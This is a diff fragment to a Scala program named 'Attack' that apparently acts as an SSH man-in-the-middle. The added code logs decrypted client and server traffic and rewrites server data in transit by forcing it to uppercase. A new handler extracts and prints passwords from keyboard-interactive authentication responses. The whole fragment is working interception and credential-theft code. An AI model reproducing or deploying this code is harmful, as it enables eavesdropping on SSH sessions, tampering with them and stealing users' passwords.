@@ -112,7 +112,15 @@ object Attack{
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte; buf.getInt
         val foo=buf.getString(start, length)
-        println("|"+new String(foo, start(0), length(0))+"|")
+        println("from server> "+new String(foo, start(0), length(0))+"|")
+
+        // toUpperCase
+        var i = start(0)
+        while(i < start(0)+length(0)){
+          foo(i) = if(0x61<=foo(i)&&foo(i)<=0x7a)(foo(i)-32).asInstanceOf[Byte]
+                   else foo(i)
+          i += 1
+        }
       case _ =>
     }
     p.getBuffer.rewind
@@ -127,7 +135,7 @@ object Attack{
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte; buf.getInt
         val foo=buf.getString(start, length)
-        println("|"+new String(foo, start(0), length(0))+"|")
+        println("from client> "+new String(foo, start(0), length(0)))
       case 50 =>
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte;
@@ -145,6 +153,15 @@ object Attack{
             // for "keyboard-interactive",
             // SSH_MSG_USERAUTH_INFO_RESPONSE(61) should be checked.
           case _ =>
+        }
+      case 61 =>
+        val buf = p.getBuffer
+        buf.getInt; buf.getByte; buf.getByte;
+        buf.getInt match {
+          case 1 => 
+            val foo=buf.getString(start, length)
+            println("password: "+new String(foo, start(0), length(0))) 
+          case _ => 
         }
       case _ =>
     }
